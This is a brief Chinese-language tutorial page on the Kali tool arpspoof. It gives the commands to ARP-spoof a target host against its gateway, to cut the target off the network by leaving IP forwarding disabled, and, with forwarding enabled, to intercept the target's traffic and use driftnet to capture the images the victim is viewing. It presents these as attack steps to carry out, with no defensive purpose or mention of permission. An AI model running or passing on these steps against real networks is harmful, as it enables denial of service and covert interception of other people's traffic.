arpspoof
################



arpspoof 是一款进行arp欺骗的工具

::

    arpspoof -i 网卡 -t 目标ip 默认网关

如果kali没有进行IP转发  那么目标就会因为配置错网而导致断网 这就是所谓的arp断网攻击

::

    开启IP转发:echo 1 >/proc/sys/net/ipv4/ip_forward
    关闭IP转发:echo 0 >/proc/sys/net/ipv4/ip_forward
    查看IP转发是否成功:cat /proc/sys/net/ipv4/ip_forward  如果显示1则表示开启成功,显示0则开启失败

开启IP转发后 流量会经过kali的主机而后再去到目标 所以这时开启arpspoof 那么目标就不会断网

因为流量通过了kali主机那么我们就可以做点手脚了

比如:

获取目标主机正在访问的图片-->工具 arpspoof 和 driftnet

::

    driftnet用法: driftnet -i 网卡

在开启路由转发后 开启arpspoof 因为流量通过了kali主机 我们就可以用driftnet获取在流量中的图片

